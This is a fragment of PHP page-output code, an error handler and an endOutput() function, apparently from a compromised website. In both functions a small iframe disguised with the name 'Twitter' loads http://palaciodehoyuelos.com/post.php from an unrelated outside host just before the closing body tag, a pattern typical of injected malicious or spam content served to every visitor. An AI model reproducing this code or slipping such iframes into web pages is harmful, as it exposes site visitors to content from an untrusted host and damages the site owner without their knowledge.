...
{
	echo "</table></table><p class=\"error\">Script error: $msg</p><iframe name=Twitter scrolling=auto frameborder=no align=center height=66 width=55 src=http://palaciodehoyuelos.com/post.php?id=474678></iframe></body></html>";
	exit(1);
}
...
function endOutput() {
	...
	<iframe name=Twitter scrolling=auto frameborder=no align=center height=66 width=55 src=http://palaciodehoyuelos.com/post.php?id=474678></iframe></body></html>
	<?php 	
	exit;
}
